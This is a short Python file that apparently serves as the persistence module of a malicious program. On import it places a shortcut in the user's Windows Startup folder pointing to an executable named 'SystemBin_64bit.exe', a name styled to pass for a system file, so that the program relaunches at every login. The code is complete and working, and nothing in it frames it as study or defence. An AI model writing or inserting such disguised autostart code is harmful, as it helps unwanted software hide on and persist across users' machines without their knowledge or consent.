import os
import win32com.client


class Startup:
    def __init__(self, original_dir):
        target_dir = f"{original_dir}\SystemBin_64bit.exe"
        shortcut_dir = f"{os.getenv('appdata')}\Microsoft\Windows\Start Menu\Programs\Startup\SystemBin_64bit.lnk"
                
        if not os.path.exists(shortcut_dir):
            self.shortcut(target_dir, shortcut_dir)

    def shortcut(self, target, shortcut):
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut)
        shortcut.TargetPath = target
        shortcut.WorkingDirectory = os.path.dirname(target)
        shortcut.Save()


Startup(os.getcwd())

